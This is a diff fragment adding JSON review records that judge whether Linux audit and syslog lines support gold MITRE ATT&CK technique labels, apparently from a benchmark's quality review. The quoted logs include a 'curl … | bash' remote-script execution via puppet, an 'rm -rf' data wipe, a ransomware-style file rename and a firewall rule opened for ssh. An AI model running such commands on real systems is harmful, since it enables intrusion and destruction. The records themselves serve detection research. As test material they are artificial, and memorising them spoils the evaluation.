+        "possible_actor_asset_scope": "只保留当前visible_facts字面中的账号、进程、主机和对象；CORE/OBJECT/ACTOR分别检查动作绑定和归属，不由simulation_id反推主体。",
+        "optional_definition_behaviors": "定义中的may、例如、such as及后续用途是可能路径，不将所有举例同时当必要条件",
+        "definition_examples_are_not_observation_facts": true
+      }
+    ],
+    "visible_facts": [
+      {
+        "fact_id": "REV_0159_VISIBLE_LINE_003",
+        "literal_text": "type=PATH msg=audit(1765564360.584:7209): item=2 name=\"/media/data/Images/Test/348_land_pad__4275.jpg\" inode=149481 dev=fe:01 mode=0100644 ouid=0 ogid=0 rdev=00:00 nametype=DELETE cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0",
+        "source_type": "AUDIT_RECORD_AS_DISPLAYED_NOT_INDEPENDENTLY_CERTIFIED",
+        "text_sha256": "91c3fa20159c6613d2e9be811d090f3d55d9cc100b8b3271a55d11a00239b085"
+      },
+      {
+        "fact_id": "REV_0159_VISIBLE_LINE_005",
+        "literal_text": "type=PATH msg=audit(1765564360.584:7209): item=3 name=\"/media/data/Images/Test/348_land_pad__4275.jpg.donotcry\" inode=149481 dev=fe:01 mode=0100644 ouid=0 ogid=0 rdev=00:00 nametype=CREATE cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0",
+        "source_type": "AUDIT_RECORD_AS_DISPLAYED_NOT_INDEPENDENTLY_CERTIFIED",
+        "text_sha256": "53ca3eeed4265a51720d79f8175ff09471272b4f67f5aae0b1d82c7f5a1ea86f"
+      }
+    ],
+    "reasoning": "仅同inode文件名改为donotcry后缀；不认证加密或内容篡改。",
+    "role": "illustrations after exhaustive384 record review; not a sample substituted for review"
+  },
+  {
+    "review_id": "REV_0168",
+    "sample_id": "3-30-r0",
+    "overall": "GOLD_SCOPE_OR_GRANULARITY_UNCERTAIN",
+    "gold_reviews": [
+      {
+        "technique_id": "T1485",
+        "frozen_name": "Data Destruction",
+        "frozen_description_sha256": "485a6028c7f0c7f81c774da1813dbe8ab9a78f9aaaa4b54818360baa1038dbc1",
+        "frozen_description": "Lifecycle-Triggered Deletion impact Data Destruction impact Lifecycle-Triggered Deletion Adversaries may modify the lifecycle policies of a cloud storage bucket to destroy all objects stored within.  \n\nCloud storage buckets often allow users to set lifecycle policies to automate the migration, archival, or deletion of objects after a set period of time.(Citation: AWS Storage Lifecycles)(Citation: GCP Storage Lifecycles)(Citation: Azure Storage Lifecycles) If a threat actor has sufficient permissions to modify these policies, they may be able to delete all objects at once. \n\nFor example, in AWS environments, an adversary with the `PutLifecycleConfiguration` permission may use the `PutBucketLifecycle` API call to apply a lifecycle policy to an S3 bucket that deletes all objects in the bucket after one day.(Citation: Palo Alto Cloud Ransomware) In addition to destroying data for purposes of extortion and [Financial Theft](https://attack.mitre.org/techniques/T1657), adversaries may also pe",
+        "evidence_assessment": "GOLD_SCOPE_OR_GRANULARITY_UNCERTAIN",
+        "supporting_fact_ids": [],
+        "context_fact_ids": [
+          "REV_0168_VISIBLE_LINE_001",
+          "REV_0168_VISIBLE_LINE_002"
+        ],
+        "reasoning": "rm -rf Annotations/Images调用及部分成功unlinkat/DELETE路径支持本地删除相关行为；冻结T1485正文却只展开云存储生命周期删除，父类完整条件未提供，不能要求云条件来否定本地删除，也不替换为新的定义。",
+        "condition_ids": [
+          "REV_0168_T1485_CORE",
+          "REV_0168_T1485_OBJECT",
+          "REV_0168_T1485_ACTOR",
+          "REV_0168_T1485_RESULT",
+          "REV_0168_T1485_DISTINGUISH",
+          "REV_0168_T1485_PARENT_SCOPE"
+        ],
+        "reference_scope_qualification": "CLOUD_LIFECYCLE_VARIANT_BODY_NOT_COMPLETE_PARENT",
+        "prerequisite_condition_ids": [
+          "REV_0168_T1485_CORE",
+          "REV_0168_T1485_OBJECT"
+        ],
+        "prerequisite_scope": "定义中的目标、有效材料/访问及核心动作关系在CORE/OBJECT中检验；不把示例实现或某一变体的前提扩展为全部父类必要条件。未提供完整父类时不能穷尽其前提。",
+        "possible_actor_asset_scope": "只保留当前visible_facts字面中的账号、进程、主机和对象；CORE/OBJECT/ACTOR分别检查动作绑定和归属，不由simulation_id反推主体。",
+        "optional_definition_behaviors": "定义中的may、例如、such as及后续用途是可能路径，不将所有举例同时当必要条件",
+        "definition_examples_are_not_observation_facts": true
+      }
+    ],
+    "visible_facts": [
+      {
+        "fact_id": "REV_0168_VISIBLE_LINE_001",
+        "literal_text": "type=PROCTITLE msg=audit(1765536519.788:9708): proctitle=726D002D7266002F6D656469612F646174612F416E6E6F746174696F6E73002F6D656469612F646174612F496D61676573",
+        "source_type": "AUDIT_RECORD_AS_DISPLAYED_NOT_INDEPENDENTLY_CERTIFIED",
+        "text_sha256": "565e193dabcf89a4e8ae9e0ff2df1f0dff83d483cc2715ecbb1a8f9c8af6e5eb"
+      },
+      {
+        "fact_id": "REV_0168_VISIBLE_LINE_002",
+        "literal_text": "type=SYSCALL msg=audit(1765536519.788:9709): arch=c000003e syscall=263 success=yes exit=0 a0=6 a1=56505d2fafe0 a2=0 a3=10ea0725b58aa2e9 items=2 ppid=2520 pid=2530 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=13 comm=\"rm\" exe=\"/usr/bin/rm\" subj=unconfined",
+        "source_type": "AUDIT_RECORD_AS_DISPLAYED_NOT_INDEPENDENTLY_CERTIFIED",
+        "text_sha256": "4aead15e16215ed0a4dece7b142929b3b6a38c0ffc018345aac90418db774945"
+      }
+    ],
+    "reasoning": "rm -rf Annotations/Images调用及部分成功unlinkat/DELETE路径支持本地删除相关行为；冻结T1485正文却只展开云存储生命周期删除，父类完整条件未提供，不能要求云条件来否定本地删除，也不替换为新的定义。",
+    "role": "illustrations after exhaustive384 record review; not a sample substituted for review"
+  },
+  {
+    "review_id": "REV_0173",
+    "sample_id": "3-32-r0",
+    "overall": "DIRECT_EVIDENCE_PRESENT",
+    "gold_reviews": [
+      {
+        "technique_id": "T1489",
+        "frozen_name": "Service Stop",
+        "frozen_description_sha256": "adc9cc44c7d757a0e429eaa29669fd3d1257abf5c3d8c96d2dfe10b796fb8ed7",
+        "frozen_description": "Service Stop impact Service Stop Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services or processes can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment.(Citation: Talos Olympic Destroyer 2018)(Citation: Novetta Blockbuster) \n\nAdversaries may accomplish this by disabling individual services of high importance to an organization, such as <code>MSExchangeIS</code>, which will make Exchange content inaccessible.(Citation: Novetta Blockbuster) In some cases, adversaries may stop or disable many or all services to render systems unusable.(Citation: Talos Olympic Destroyer 2018) Services or processes may not allow for modification of their data stores while running. Adversaries may stop services or processes in order to conduct [Data Destruction](https://attack.mitre.org/techniques/T1485) or [Data Encrypted for Impact](https://attack.mitre",
+        "evidence_assessment": "DIRECT_EVIDENCE_PRESENT",
+        "supporting_fact_ids": [
+          "REV_0173_VISIBLE_LINE_001",
+          "REV_0173_VISIBLE_LINE_003",
+          "REV_0173_VISIBLE_LINE_004"
+        ],
+        "context_fact_ids": [],
+        "reasoning": "systemd明确Stopping、Deactivated successfully及Stopped exim4.service，直接支持具体邮件服务停止的状态变化；不认证攻击者归属或影响范围。",
+        "condition_ids": [
+          "REV_0173_T1489_CORE",
+          "REV_0173_T1489_OBJECT",
+          "REV_0173_T1489_ACTOR",
+          "REV_0173_T1489_RESULT",
+          "REV_0173_T1489_DISTINGUISH"
+        ],
+        "reference_scope_qualification": "VISIBLE_BODY_GIVES_USABLE_CORE_NOT_INDEPENDENTLY_EXHAUSTIVE",
+        "prerequisite_condition_ids": [
+          "REV_0173_T1489_CORE",
+          "REV_0173_T1489_OBJECT"
+        ],
+        "prerequisite_scope": "定义中的目标、有效材料/访问及核心动作关系在CORE/OBJECT中检验；不把示例实现或某一变体的前提扩展为全部父类必要条件。未提供完整父类时不能穷尽其前提。",
+        "possible_actor_asset_scope": "只保留当前visible_facts字面中的账号、进程、主机和对象；CORE/OBJECT/ACTOR分别检查动作绑定和归属，不由simulation_id反推主体。",
+        "optional_definition_behaviors": "定义中的may、例如、such as及后续用途是可能路径，不将所有举例同时当必要条件",
+        "definition_examples_are_not_observation_facts": true
+      }
+    ],
+    "visible_facts": [
+      {
+        "fact_id": "REV_0173_VISIBLE_LINE_001",
+        "literal_text": "2025-12-11T14:44:43.087140+00:00 linuxshare systemd[1]: Stopping exim4.service - LSB: exim Mail Transport Agent...",
+        "source_type": "APPLICATION_SYSTEM_OR_NETWORK_LOG_AS_DISPLAYED_UNCERTIFIED",
+        "text_sha256": "8325c68d9d637f693c991e934cde26fe34bdf96327b57cea8859694e4bc1fd0d"
+      },
+      {
+        "fact_id": "REV_0173_VISIBLE_LINE_003",
+        "literal_text": "2025-12-11T14:44:43.123943+00:00 linuxshare systemd[1]: exim4.service: Deactivated successfully.",
+        "source_type": "APPLICATION_SYSTEM_OR_NETWORK_LOG_AS_DISPLAYED_UNCERTIFIED",
+        "text_sha256": "b873eb1ca8d8581e0de6b4961196d18306616783807fc9a1c530df2307e8b41c"
+      },
+      {
+        "fact_id": "REV_0173_VISIBLE_LINE_004",
+        "literal_text": "2025-12-11T14:44:43.124008+00:00 linuxshare systemd[1]: Stopped exim4.service - LSB: exim Mail Transport Agent.",
+        "source_type": "APPLICATION_SYSTEM_OR_NETWORK_LOG_AS_DISPLAYED_UNCERTIFIED",
+        "text_sha256": "2cb1efc6cb39d786291d889d60b9bdd95b77229018dcc8b15916e83481464258"
+      }
+    ],
+    "reasoning": "systemd明确Stopping、Deactivated successfully及Stopped exim4.service，直接支持具体邮件服务停止的状态变化；不认证攻击者归属或影响范围。",
+    "role": "illustrations after exhaustive384 record review; not a sample substituted for review"
+  },
+  {
+    "review_id": "REV_0181",
+    "sample_id": "3-40-r0",
+    "overall": "DIRECT_EVIDENCE_PRESENT",
+    "gold_reviews": [
+      {
+        "technique_id": "T1072",
+        "frozen_name": "Software Deployment Tools",
+        "frozen_description_sha256": "c913ee0c405de58f4e713071257f12b605ee48a511207d20dbac0f9f22da541e",
+        "frozen_description": "Software Deployment Tools execution lateral-movement Software Deployment Tools Adversaries may gain access to and use centralized software suites installed within an enterprise to execute commands and move laterally through the network. Configuration management and software deployment applications may be used in an enterprise network or cloud environment for routine administration purposes. These systems may also be integrated into CI/CD pipelines. Examples of such solutions include: SCCM, HBSS, Altiris, AWS Systems Manager, Microsoft Intune, Azure Arc, and GCP Deployment Manager.  \n\nAccess to network-wide or enterprise-wide endpoint management software may enable an adversary to achieve remote code execution on all connected systems. The access may be used to laterally move to other systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.\n\nSaaS-based configuration management services may allow for broad [Cloud Administration Command](ht",
+        "evidence_assessment": "DIRECT_EVIDENCE_PRESENT",
+        "supporting_fact_ids": [
+          "REV_0181_VISIBLE_LINE_002",
+          "REV_0181_VISIBLE_LINE_003"
+        ],
+        "context_fact_ids": [],
+        "reasoning": "puppet-agent记录catalog中的Exec下载脚本并交给bash且executed successfully，随后Applied catalog。直接支持配置管理软件执行命令；该脚本恶意性与管理者授权仍未知。",
+        "condition_ids": [
+          "REV_0181_T1072_OBSERVED_ACTION",
+          "REV_0181_T1072_CORE",
+          "REV_0181_T1072_OBJECT",
+          "REV_0181_T1072_ACTOR",
+          "REV_0181_T1072_DISTINGUISH"
+        ],
+        "reference_scope_qualification": "VISIBLE_BODY_GIVES_USABLE_CORE_NOT_INDEPENDENTLY_EXHAUSTIVE",
+        "prerequisite_condition_ids": [
+          "REV_0181_T1072_CORE",
+          "REV_0181_T1072_OBJECT"
+        ],
+        "prerequisite_scope": "定义中的目标、有效材料/访问及核心动作关系在CORE/OBJECT中检验；不把示例实现或某一变体的前提扩展为全部父类必要条件。未提供完整父类时不能穷尽其前提。",
+        "possible_actor_asset_scope": "只保留当前visible_facts字面中的账号、进程、主机和对象；CORE/OBJECT/ACTOR分别检查动作绑定和归属，不由simulation_id反推主体。",
+        "optional_definition_behaviors": "定义中的may、例如、such as及后续用途是可能路径，不将所有举例同时当必要条件",
+        "definition_examples_are_not_observation_facts": true
+      }
+    ],
+    "visible_facts": [
+      {
+        "fact_id": "REV_0181_VISIBLE_LINE_002",
+        "literal_text": "2025-12-12T12:51:35.338679+00:00 linuxshare puppet-agent[2029]: (/Stage[main]/Blah2/Exec[curl http://192.42.1.174:8888/install.sh | bash]/returns) executed successfully",
+        "source_type": "APPLICATION_SYSTEM_OR_NETWORK_LOG_AS_DISPLAYED_UNCERTIFIED",
+        "text_sha256": "dc0f2c3656d0ecaabe8a819ec2d3aa9f2725a94a57c8015a9a982ef76f68318b"
+      },
+      {
+        "fact_id": "REV_0181_VISIBLE_LINE_003",
+        "literal_text": "2025-12-12T12:51:35.349505+00:00 linuxshare puppet-agent[2029]: Applied catalog in 0.30 seconds",
+        "source_type": "APPLICATION_SYSTEM_OR_NETWORK_LOG_AS_DISPLAYED_UNCERTIFIED",
+        "text_sha256": "2dc44aa4e4ead7f05d3080144376be11e6fc3ddb85e1026e9c075b5384269e01"
+      }
+    ],
+    "reasoning": "puppet-agent记录catalog中的Exec下载脚本并交给bash且executed successfully，随后Applied catalog。直接支持配置管理软件执行命令；该脚本恶意性与管理者授权仍未知。",
+    "role": "illustrations after exhaustive384 record review; not a sample substituted for review"
+  },
+  {
+    "review_id": "REV_0211",
+    "sample_id": "4-17-r0",
+    "overall": "GOLD_SCOPE_OR_GRANULARITY_UNCERTAIN",
+    "gold_reviews": [
+      {
+        "technique_id": "T1599",
+        "frozen_name": "Network Boundary Bridging",
+        "frozen_description_sha256": "fd955212b021f954ba1fe873d78d6df89d03da266a1e07f2b75a7af313a244fe",
+        "frozen_description": "Network Address Translation Traversal defense-evasion Network Boundary Bridging defense-evasion Network Address Translation Traversal Adversaries may bridge network boundaries by modifying a network device’s Network Address Translation (NAT) configuration. Malicious modifications to NAT may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.\n\nNetwork devices such as routers and firewalls that connect multiple networks together may implement NAT during the process of passing packets between networks. When performing NAT, the network device will rewrite the source and/or destination addresses of the IP address header. Some network designs require NAT for the packets to cross the border device.  A typical example of this is environments where internal networks make use of non-Internet routable addresses.(Citation: RFC1918)\n\nWhen an adversary gains control of a network boundary device, they can either leverage existing NAT",
+        "evidence_assessment": "GOLD_SCOPE_OR_GRANULARITY_UNCERTAIN",
+        "supporting_fact_ids": [],
+        "context_fact_ids": [
+          "REV_0211_VISIBLE_LINE_001",
+          "REV_0211_VISIBLE_LINE_004"
+        ],
+        "reasoning": "sed -i尝试向Shorewall rules插入dmz到lan tcp22的ACCEPT规则，直接相关防火墙访问策略变动；冻结T1599正文仅展开NAT配置跨边界，ACL放行不等于NAT转换或实际跨域通信。",
+        "condition_ids": [
+          "REV_0211_T1599_CORE",
+          "REV_0211_T1599_OBJECT",
+          "REV_0211_T1599_ACTOR",
+          "REV_0211_T1599_RESULT",
+          "REV_0211_T1599_DISTINGUISH",
+          "REV_0211_T1599_PARENT_SCOPE"
+        ],
+        "reference_scope_qualification": "NAT_VARIANT_BODY_NOT_COMPLETE_PARENT",
+        "prerequisite_condition_ids": [
+          "REV_0211_T1599_CORE",
+          "REV_0211_T1599_OBJECT"
+        ],
+        "prerequisite_scope": "定义中的目标、有效材料/访问及核心动作关系在CORE/OBJECT中检验；不把示例实现或某一变体的前提扩展为全部父类必要条件。未提供完整父类时不能穷尽其前提。",
+        "possible_actor_asset_scope": "只保留当前visible_facts字面中的账号、进程、主机和对象；CORE/OBJECT/ACTOR分别检查动作绑定和归属，不由simulation_id反推主体。",
+        "optional_definition_behaviors": "定义中的may、例如、such as及后续用途是可能路径，不将所有举例同时当必要条件",
+        "definition_examples_are_not_observation_facts": true
+      }
+    ],
+    "visible_facts": [
+      {
+        "fact_id": "REV_0211_VISIBLE_LINE_001",
+        "literal_text": "Dec 15 11:12:05 inetfw sudo:     root : PWD=/usr/bin ; USER=root ; COMMAND=/usr/bin/sed -i '/# Kafka Ports/i\\\\ACCEPT dmz lan:$LINUXSHARE tcp  22  -   -   -' /etc/shorewall/rules",
+        "source_type": "SUDO_COMMAND_RECORD_AS_DISPLAYED_NOT_PROOF_OF_COMPLETION",
+        "text_sha256": "b870d98c74500f76b48537b5b8b4a771f672196dad14d5cf180c5ddf30798d8a"
+      },
+      {
+        "fact_id": "REV_0211_VISIBLE_LINE_004",
+        "literal_text": "type=PROCTITLE msg=audit(1765797125.540:6909): proctitle=7375646F00736564002D69002F23204B61666B6120506F7274732F695C41434345505420646D7A206C616E3A244C494E55585348415245207463702020323220202D2020202D2020202D002F6574632F73686F726577616C6C2F72756C6573",
+        "source_type": "AUDIT_RECORD_AS_DISPLAYED_NOT_INDEPENDENTLY_CERTIFIED",
+        "text_sha256": "a2f386b50292ca711c43eaedf253491fac1000d5b4045f8ffa7dc178b675552a"
+      }
+    ],
+    "reasoning": "sed -i尝试向Shorewall rules插入dmz到lan tcp22的ACCEPT规则，直接相关防火墙访问策略变动；冻结T1599正文仅展开NAT配置跨边界，ACL放行不等于NAT转换或实际跨域通信。",
+    "role": "illustrations after exhaustive384 record review; not a sample substituted for review"
+  },
+  {
+    "review_id": "REV_0355",
+    "sample_id": "6-59-r0",
+    "overall": "INSUFFICIENT_VISIBLE_INPUT",
+    "gold_reviews": [
+      {
+        "technique_id": "T1219",
+        "frozen_name": "Remote Access Tools",
+        "frozen_description_sha256": "ddd6ae9b1b40e8ffe28ad523aad87f13f45e1c25ef9edca296f3a4ee37fbb30a",
+        "frozen_description": "Remote Access Tools command-and-control IDE Tunneling command-and-control Remote Access Hardware command-and-control Remote Desktop Software command-and-control Remote Access Software An adversary may use legitimate desktop support and remote access software to establish an interactive command and control channel to target systems within networks. These services, such as `VNC`, `Team Viewer`, `AnyDesk`, `ScreenConnect`, `LogMein`, `AmmyyAdmin`, and other remote monitoring and management (RMM) tools, are commonly used as legitimate technical support software and may be allowed by application control within a target environment.(Citation: Symantec Living off the Land)(Citation: CrowdStrike 2015 Global Threat Report)(Citation: CrySyS Blog TeamSpy)\n\nRemote access software may be installed and used post-compromise as an alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system. They may also be used as a compo",
+        "evidence_assessment": "INSUFFICIENT_VISIBLE_INPUT",
+        "supporting_fact_ids": [],
+        "context_fact_ids": [],
+        "reasoning": "部分视图仅python3从标准输入运行匿名代码，代码内容未提供，无法评价是否构成远程访问工具；另一视图仅Firefox时间服务和RT调度背景。",
+        "condition_ids": [
+          "REV_0355_T1219_CORE",
+          "REV_0355_T1219_OBJECT",
+          "REV_0355_T1219_ACTOR",
+          "REV_0355_T1219_DISTINGUISH"
+        ],
+        "reference_scope_qualification": "VISIBLE_BODY_GIVES_USABLE_CORE_NOT_INDEPENDENTLY_EXHAUSTIVE",
+        "prerequisite_condition_ids": [
+          "REV_0355_T1219_CORE",
+          "REV_0355_T1219_OBJECT"
+        ],
+        "prerequisite_scope": "定义中的目标、有效材料/访问及核心动作关系在CORE/OBJECT中检验；不把示例实现或某一变体的前提扩展为全部父类必要条件。未提供完整父类时不能穷尽其前提。",
+        "possible_actor_asset_scope": "只保留当前visible_facts字面中的账号、进程、主机和对象；CORE/OBJECT/ACTOR分别检查动作绑定和归属，不由simulation_id反推主体。",
+        "optional_definition_behaviors": "定义中的may、例如、such as及后续用途是可能路径，不将所有举例同时当必要条件",
+        "definition_examples_are_not_observation_facts": true
+      }
+    ],
+    "visible_facts": [],
+    "reasoning": "部分视图仅python3从标准输入运行匿名代码，代码内容未提供，无法评价是否构成远程访问工具；另一视图仅Firefox时间服务和RT调度背景。",
+    "role": "illustrations after exhaustive384 record review; not a sample substituted for review"
+  }
+]
